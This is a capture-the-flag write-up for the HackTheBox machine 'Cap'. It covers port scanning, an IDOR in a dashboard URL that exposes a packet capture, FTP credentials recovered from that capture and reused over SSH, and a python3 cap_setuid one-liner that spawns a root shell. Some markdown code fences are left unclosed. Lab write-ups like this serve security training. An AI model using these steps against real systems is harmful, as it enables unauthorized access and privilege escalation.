Cap is an easy rated machine on HackTheBox by [InfoSecJack](https://www.hackthebox.eu/home/users/profile/52045). For the user part we will find credentials for the ftp service in a pcap by abusing IDOR. These credentials are reused for ssh which gives us access to the machine as nathan. To get root we will then abuse the suid capability on python.

# User
## Nmap

As always we start our enumeration of with a nmap scan against all open ports, followed by a script and Version detection scan against the open ones to get an initial picture of the attack surface.

`All ports`

```
$sudo nmap -p-  -T4  10.129.48.115
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 19:38 UTC
Nmap scan report for 10.129.48.115
Host is up (0.041s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 84.61 seconds
```

`Script and version`
```
$sudo nmap -sC -sV -p21,22,80 10.129.48.115

## Pcap

Port 80 seems to be the most promising inital target and going there we see a security dashboard with 3 different functionalities. We can download a PCAP, look at the IP configuration and look at the output of netstat.

[![home](/img/cap/home.png)](/img/cap/home.png)

Going over to the Security Snapshot PCAP we don't get any usefull information downloading the file presented. We can however change the number after `data` in the URL to download the first available pcap 0.

[![idor](/img/cap/idor.png)](/img/cap/idor.png)

Analyzing this PCAP in wireshark we see some HTTP and FTP traffic.

[![wireshark](/img/cap/wireshark.png)](/img/cap/wireshark.png)

Following the TCP-Stream for the FTP traffic reveals FTP credentials for the user nathan.

[![wireshark_follow](/img/cap/wireshark_follow.png)](/img/cap/wireshark_follow.png)

This credentials where reused for ssh which gives us access to the machine and the user flag.

```

# Root
## Python Capability

Looking at the capabilites we see that python has the `cap_setuid` capability set. This means we can set the user id running python.

```
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

We can abuse this quickly to get a shell as root by first importing `os`, setting the user id to 0 (root) and then spawning a bash shell. Now we can add the root flag to our collection.

```
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# wc -c /root/root.txt
33 /root/root.txt
```
